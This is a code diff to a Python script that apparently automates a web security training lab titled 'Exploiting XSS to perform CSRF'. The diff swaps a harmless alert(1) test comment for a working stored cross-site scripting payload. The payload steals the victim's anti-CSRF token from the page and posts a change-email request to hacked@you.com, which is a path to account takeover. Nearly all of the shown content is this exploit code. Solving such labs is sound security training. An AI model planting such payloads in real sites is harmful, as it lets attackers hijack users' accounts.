@@ -4,7 +4,7 @@ import urllib3
 
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 
-LAB_NAME = "Stored XSS into HTML context with nothing encoded"
+LAB_NAME = "Exploiting XSS to perform CSRF"
 
 def run(url, payload=None, proxies=None):
     session = requests.Session()
@@ -22,11 +22,22 @@ def run(url, payload=None, proxies=None):
             "postId": "1",
             "name": "mystic_mido",
             "email": "mystic_mido@mystic_mido.com",
-            "website": "https://snehbavarva.com",
-            "comment": "<script>alert(1)</script>"
+            "comment": f"""<script>
+                    window.onload = function(){{
+                        var token = document.forms[0].firstElementChild.value;
+                        fetch("{url.rstrip('/')}/my-account/change-email", {{
+                            method: "POST",
+                            headers: {{
+                                "Content-Type":  "application/x-www-form-urlencoded"
+                            }},
+                            body: "csrf=" + token + "&email=hacked@you.com" 
+                        }});
+                    }};
+                </script>"""
         }
 
         response = session.post(url.rstrip('/') + "/post/comment", data=data)
+        r = session.get(url.rstrip('/') + "/post?postId=1")
         return "Congratulations, you solved the lab!" in response.text or response.status_code == 200
 
     except Exception as e:
